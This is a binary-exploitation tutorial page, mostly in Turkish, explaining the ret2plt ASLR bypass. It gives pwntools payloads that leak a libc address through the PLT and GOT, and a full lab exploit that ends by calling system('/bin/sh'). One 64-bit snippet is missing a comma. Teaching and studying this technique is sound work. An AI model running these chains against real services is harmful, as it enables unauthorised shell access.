# Ret2plt

{{#include ../../../banners/hacktricks-training.md}}

## Temel Bilgiler

Bu tekniğin amacı, ASLR'yi atlatabilmek için **PLT'deki bir fonksiyondan bir adres leak etmek**. Bu, örneğin libc'den `puts` fonksiyonunun adresini leak ederseniz, daha sonra **libc'nin taban adresini hesaplayabilirsiniz** ve `system` gibi diğer fonksiyonlara erişmek için offsetleri hesaplayabilirsiniz.

Bu, `pwntools` payload'u ile şu şekilde yapılabilir ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Dikkat edin: **`puts`** (PLT'den alınan adres kullanılarak) GOT (Global Offset Table) içinde bulunan `puts` adresi ile çağrılıyor. Bunun nedeni, `puts` GOT girişini yazdırdığında, bu **giriş bellekte `puts`'in tam adresini içerecek** olmasıdır.

Ayrıca exploit'te `main` adresinin kullanıldığını not edin; böylece `puts` yürütmesi bittiğinde, **binary çıkış yapmak yerine tekrar `main`'i çağırır** (so the leaked address will continue to be valid).

> [!CAUTION]
> Bu durumun çalışması için **binary'nin PIE ile derlenmiş olmaması** gerekir veya PLT, GOT ve main adreslerini bilmek için **PIE'yi bypass etmek amacıyla bir leak bulmuş olmanız** gerekir. Aksi halde önce PIE'yi bypass etmeniz gerekir.

You can find a [**full example of this bypass here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). This was the final exploit from that **example**:

<details>
<summary>Full exploit example (ret2plt leak + system)</summary>
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
</details>

## Modern considerations

- **`-fno-plt` builds** (common in modern distros) replace `call foo@plt` with `call [foo@got]`. If the binary has no `foo@plt` stub, you can still leak the resolved address with `puts(elf.got['foo'])` and then **return directly to the GOT entry** (`flat(padding, elf.got['foo'])`) to jump into libc once lazy binding has completed.
- **Full RELRO / `-Wl,-z,now`**: GOT is read‑only but ret2plt still works for leaks because you only read the GOT slot. If the symbol was never called, your first ret2plt will also perform lazy binding and then print the resolved slot.
- **ASLR + PIE**: if PIE is enabled, first leak a code pointer (e.g., saved return address, function pointer, or `.plt` entry via another format‑string/infoleak) to compute the PIE base, then build the ret2plt chain with the rebased PLT/GOT addresses.
- **Non‑x86 architectures with BTI/PAC (AArch64)**: PLT entries are valid BTI landing pads (`bti c`), so when exploiting on BTI‑enabled binaries prefer jumping into the PLT stub (or another BTI‑annotated gadget) instead of directly into a libc gadget without BTI, otherwise the CPU will raise `BRK`/`PAC` failures.
- **Quick resolution helper**: if the target function is not yet resolved and you need a leak in a single shot, chain the PLT call twice: first `elf.plt['foo']` (to resolve) then again `elf.plt['foo']` with the GOT address as argument to print the now‑filled slot.

## Other examples & References

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit, ASLR enabled but no PIE, the first step is to fill an overflow until the byte 0x00 of the canary to then call puts and leak it. With the canary a ROP gadget is created to call puts to leak the address of puts from the GOT and the a ROP gadget to call `system('/bin/sh')`
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR enabled, no canary, stack overflow in main from a child function. ROP gadget to call puts to leak the address of puts from the GOT and then call an one gadget.

## References

- [MaskRay – All about Procedure Linkage Table](https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table)

{{#include ../../../banners/hacktricks-training.md}}
